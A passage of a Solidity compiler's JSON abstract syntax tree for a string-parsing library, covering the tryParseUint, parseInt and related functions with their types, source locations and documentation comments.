(bool,uint256)"}},"id":699,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6417:47:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"functionReturnParameters":678,"id":700,"nodeType":"Return","src":"6410:54:3"}]},"documentation":{"id":666,"nodeType":"StructuredDocumentation","src":"5931:238:3","text":" @dev Variant of {parseUint-string-uint256-uint256} that returns false if the parsing fails because of an invalid\n character.\n NOTE: This function will revert if the result does not fit in a `uint256`."},"id":702,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseUint","nameLocation":"6183:12:3","nodeType":"FunctionDefinition","parameters":{"id":673,"nodeType":"ParameterList","parameters":[{"constant":false,"id":668,"mutability":"mutable","name":"input","nameLocation":"6219:5:3","nodeType":"VariableDeclaration","scope":702,"src":"6205:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":667,"name":"string","nodeType":"ElementaryTypeName","src":"6205:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":670,"mutability":"mutable","name":"begin","nameLocation":"6242:5:3","nodeType":"VariableDeclaration","scope":702,"src":"6234:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":669,"name":"uint256","nodeType":"ElementaryTypeName","src":"6234:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":672,"mutability":"mutable","name":"end","nameLocation":"6265:3:3","nodeType":"VariableDeclaration","scope":702,"src":"6257:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":671,"name":"uint256","nodeType":"ElementaryTypeName","src":"6257:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6195:79:3"},"returnParameters":{"id":678,"nodeType":"ParameterList","parameters":[{"constant":false,"id":675,"mutability":"mutable","name":"success","nameLocation":"6303:7:3","nodeType":"VariableDeclaration","scope":702,"src":"6298:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":674,"name":"bool","nodeType":"ElementaryTypeName","src":"6298:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":677,"mutability":"mutable","name":"value","nameLocation":"6320:5:3","nodeType":"VariableDeclaration","scope":702,"src":"6312:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":676,"name":"uint256","nodeType":"ElementaryTypeName","src":"6312:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6297:29:3"},"scope":1631,"src":"6174:297:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":771,"nodeType":"Block","src":"6874:347:3","statements":[{"assignments":[717],"declarations":[{"constant":false,"id":717,"mutability":"mutable","name":"buffer","nameLocation":"6897:6:3","nodeType":"VariableDeclaration","scope":771,"src":"6884:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":716,"name":"bytes","nodeType":"ElementaryTypeName","src":"6884:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":722,"initialValue":{"arguments":[{"id":720,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":705,"src":"6912:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":719,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6906:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":718,"name":"bytes","nodeType":"ElementaryTypeName","src":"6906:5:3","typeDescriptions":{}}},"id":721,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6906:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"6884:34:3"},{"assignments":[724],"declarations":[{"constant":false,"id":724,"mutability":"mutable","name":"result","nameLocation":"6937:6:3","nodeType":"VariableDeclaration","scope":771,"src":"6929:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":723,"name":"uint256","nodeType":"ElementaryTypeName","src":"6929:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":726,"initialValue":{"hexValue":"30","id":725,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6946:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"nodeType":"VariableDeclarationStatement","src":"6929:18:3"},{"body":{"id":765,"nodeType":"Block","src":"6995:189:3","statements":[{"assignments":[738],"declarations":[{"constant":false,"id":738,"mutability":"mutable","name":"chr","nameLocation":"7015:3:3","nodeType":"VariableDeclaration","scope":765,"src":"7009:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":737,"name":"uint8","nodeType":"ElementaryTypeName","src":"7009:5:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"}],"id":748,"initialValue":{"arguments":[{"arguments":[{"arguments":[{"id":743,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":717,"src":"7064:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},{"id":744,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"7072:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":742,"name":"_unsafeReadBytesOffset","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1630,"src":"7041:22:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes_memory_ptr_$_t_uint256_$returns$_t_bytes32_$","typeString":"function (bytes memory,uint256) pure returns (bytes32)"}},"id":745,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7041:33:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes32","typeString":"bytes32"}],"id":741,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7034:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes1_$","typeString":"type(bytes1)"},"typeName":{"id":740,"name":"bytes1","nodeType":"ElementaryTypeName","src":"7034:6:3","typeDescriptions":{}}},"id":746,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7034:41:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes1","typeString":"bytes1"}],"id":739,"name":"_tryParseChr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1452,"src":"7021:12:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bytes1_$returns$_t_uint8_$","typeString":"function (bytes1) pure returns (uint8)"}},"id":747,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7021:55:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"VariableDeclarationStatement","src":"7009:67:3"},{"condition":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":751,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":749,"name":"chr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":738,"src":"7094:3:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"39","id":750,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7100:1:3","typeDescriptions":{"typeIdentifier":"t_rational_9_by_1","typeString":"int_const 9"},"value":"9"},"src":"7094:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":756,"nodeType":"IfStatement","src":"7090:30:3","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":752,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"7111:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":753,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7118:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":754,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"7110:10:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":715,"id":755,"nodeType":"Return","src":"7103:17:3"}},{"expression":{"id":759,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":757,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"7134:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"hexValue":"3130","id":758,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7144:2:3","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"src":"7134:12:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":760,"nodeType":"ExpressionStatement","src":"7134:12:3"},{"expression":{"id":763,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":761,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"7160:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"+=","rightHandSide":{"id":762,"name":"chr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":738,"src":"7170:3:3","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"src":"7160:13:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":764,"nodeType":"ExpressionStatement","src":"7160:13:3"}]},"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":733,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":731,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"6981:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":732,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":709,"src":"6985:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6981:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":766,"initializationExpression":{"assignments":[728],"declarations":[{"constant":false,"id":728,"mutability":"mutable","name":"i","nameLocation":"6970:1:3","nodeType":"VariableDeclaration","scope":766,"src":"6962:9:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":727,"name":"uint256","nodeType":"ElementaryTypeName","src":"6962:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":730,"initialValue":{"id":729,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":707,"src":"6974:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"6962:17:3"},"isSimpleCounterLoop":true,"loopExpression":{"expression":{"id":735,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"++","prefix":true,"src":"6990:3:3","subExpression":{"id":734,"name":"i","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":728,"src":"6992:1:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":736,"nodeType":"ExpressionStatement","src":"6990:3:3"},"nodeType":"ForStatement","src":"6957:227:3"},{"expression":{"components":[{"hexValue":"74727565","id":767,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"7201:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},{"id":768,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":724,"src":"7207:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":769,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"7200:14:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"functionReturnParameters":715,"id":770,"nodeType":"Return","src":"7193:21:3"}]},"documentation":{"id":703,"nodeType":"StructuredDocumentation","src":"6477:224:3","text":" @dev Implementation of {tryParseUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\n `begin <= end <= input.length`. Other inputs would result in undefined behavior."},"id":772,"implemented":true,"kind":"function","modifiers":[],"name":"_tryParseUintUncheckedBounds","nameLocation":"6715:28:3","nodeType":"FunctionDefinition","parameters":{"id":710,"nodeType":"ParameterList","parameters":[{"constant":false,"id":705,"mutability":"mutable","name":"input","nameLocation":"6767:5:3","nodeType":"VariableDeclaration","scope":772,"src":"6753:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":704,"name":"string","nodeType":"ElementaryTypeName","src":"6753:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":707,"mutability":"mutable","name":"begin","nameLocation":"6790:5:3","nodeType":"VariableDeclaration","scope":772,"src":"6782:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":706,"name":"uint256","nodeType":"ElementaryTypeName","src":"6782:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":709,"mutability":"mutable","name":"end","nameLocation":"6813:3:3","nodeType":"VariableDeclaration","scope":772,"src":"6805:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":708,"name":"uint256","nodeType":"ElementaryTypeName","src":"6805:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6743:79:3"},"returnParameters":{"id":715,"nodeType":"ParameterList","parameters":[{"constant":false,"id":712,"mutability":"mutable","name":"success","nameLocation":"6850:7:3","nodeType":"VariableDeclaration","scope":772,"src":"6845:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":711,"name":"bool","nodeType":"ElementaryTypeName","src":"6845:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":714,"mutability":"mutable","name":"value","nameLocation":"6867:5:3","nodeType":"VariableDeclaration","scope":772,"src":"6859:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":713,"name":"uint256","nodeType":"ElementaryTypeName","src":"6859:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6844:29:3"},"scope":1631,"src":"6706:515:3","stateMutability":"pure","virtual":false,"visibility":"private"},{"body":{"id":790,"nodeType":"Block","src":"7518:63:3","statements":[{"expression":{"arguments":[{"id":781,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":775,"src":"7544:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":782,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7551:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":785,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":775,"src":"7560:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":784,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7554:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":783,"name":"bytes","nodeType":"ElementaryTypeName","src":"7554:5:3","typeDescriptions":{}}},"id":786,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7554:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":787,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"7567:6:3","memberName":"length","nodeType":"MemberAccess","src":"7554:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":780,"name":"parseInt","nodeType":"Identifier","overloadedDeclarations":[791,822],"referencedDeclaration":822,"src":"7535:8:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_int256_$","typeString":"function (string memory,uint256,uint256) pure returns (int256)"}},"id":788,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7535:39:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":779,"id":789,"nodeType":"Return","src":"7528:46:3"}]},"documentation":{"id":773,"nodeType":"StructuredDocumentation","src":"7227:216:3","text":" @dev Parse a decimal string and returns the value as a `int256`.\n Requirements:\n - The string must be formatted as `[-+]?[0-9]*`\n - The result must fit in an `int256` type."},"id":791,"implemented":true,"kind":"function","modifiers":[],"name":"parseInt","nameLocation":"7457:8:3","nodeType":"FunctionDefinition","parameters":{"id":776,"nodeType":"ParameterList","parameters":[{"constant":false,"id":775,"mutability":"mutable","name":"input","nameLocation":"7480:5:3","nodeType":"VariableDeclaration","scope":791,"src":"7466:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":774,"name":"string","nodeType":"ElementaryTypeName","src":"7466:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"7465:21:3"},"returnParameters":{"id":779,"nodeType":"ParameterList","parameters":[{"constant":false,"id":778,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":791,"src":"7510:6:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":777,"name":"int256","nodeType":"ElementaryTypeName","src":"7510:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"7509:8:3"},"scope":1631,"src":"7448:133:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":821,"nodeType":"Block","src":"7986:151:3","statements":[{"assignments":[804,806],"declarations":[{"constant":false,"id":804,"mutability":"mutable","name":"success","nameLocation":"8002:7:3","nodeType":"VariableDeclaration","scope":821,"src":"7997:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":803,"name":"bool","nodeType":"ElementaryTypeName","src":"7997:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":806,"mutability":"mutable","name":"value","nameLocation":"8018:5:3","nodeType":"VariableDeclaration","scope":821,"src":"8011:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":805,"name":"int256","nodeType":"ElementaryTypeName","src":"8011:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"id":812,"initialValue":{"arguments":[{"id":808,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":794,"src":"8039:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":809,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":796,"src":"8046:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":810,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":798,"src":"8053:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":807,"name":"tryParseInt","nodeType":"Identifier","overloadedDeclarations":[843,885],"referencedDeclaration":885,"src":"8027:11:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_int256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,int256)"}},"id":811,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8027:30:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_int256_$","typeString":"tuple(bool,int256)"}},"nodeType":"VariableDeclarationStatement","src":"7996:61:3"},{"condition":{"id":814,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"8071:8:3","subExpression":{"id":813,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":804,"src":"8072:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":818,"nodeType":"IfStatement","src":"8067:41:3","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":815,"name":"StringsInvalidChar","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":292,"src":"8088:18:3","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$_t_error_$","typeString":"function () pure returns (error)"}},"id":816,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8088:20:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":817,"nodeType":"RevertStatement","src":"8081:27:3"}},{"expression":{"id":819,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":806,"src":"8125:5:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"functionReturnParameters":802,"id":820,"nodeType":"Return","src":"8118:12:3"}]},"documentation":{"id":792,"nodeType":"StructuredDocumentation","src":"7587:296:3","text":" @dev Variant of {parseInt-string} that parses a substring of `input` located between position `begin` (included) and\n `end` (excluded).\n Requirements:\n - The substring must be formatted as `[-+]?[0-9]*`\n - The result must fit in an `int256` type."},"id":822,"implemented":true,"kind":"function","modifiers":[],"name":"parseInt","nameLocation":"7897:8:3","nodeType":"FunctionDefinition","parameters":{"id":799,"nodeType":"ParameterList","parameters":[{"constant":false,"id":794,"mutability":"mutable","name":"input","nameLocation":"7920:5:3","nodeType":"VariableDeclaration","scope":822,"src":"7906:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":793,"name":"string","nodeType":"ElementaryTypeName","src":"7906:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":796,"mutability":"mutable","name":"begin","nameLocation":"7935:5:3","nodeType":"VariableDeclaration","scope":822,"src":"7927:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":795,"name":"uint256","nodeType":"ElementaryTypeName","src":"7927:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":798,"mutability":"mutable","name":"end","nameLocation":"7950:3:3","nodeType":"VariableDeclaration","scope":822,"src":"7942:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":797,"name":"uint256","nodeType":"ElementaryTypeName","src":"7942:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7905:49:3"},"returnParameters":{"id":802,"nodeType":"ParameterList","parameters":[{"constant":false,"id":801,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":822,"src":"7978:6:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":800,"name":"int256","nodeType":"ElementaryTypeName","src":"7978:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"7977:8:3"},"scope":1631,"src":"7888:249:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":842,"nodeType":"Block","src":"8528:82:3","statements":[{"expression":{"arguments":[{"id":833,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":825,"src":"8573:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":834,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8580:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":837,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":825,"src":"8589:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":836,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8583:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":835,"name":"bytes","nodeType":"ElementaryTypeName","src":"8583:5:3","typeDescriptions":{}}},"id":838,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8583:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":839,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"8596:6:3","memberName":"length","nodeType":"MemberAccess","src":"8583:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 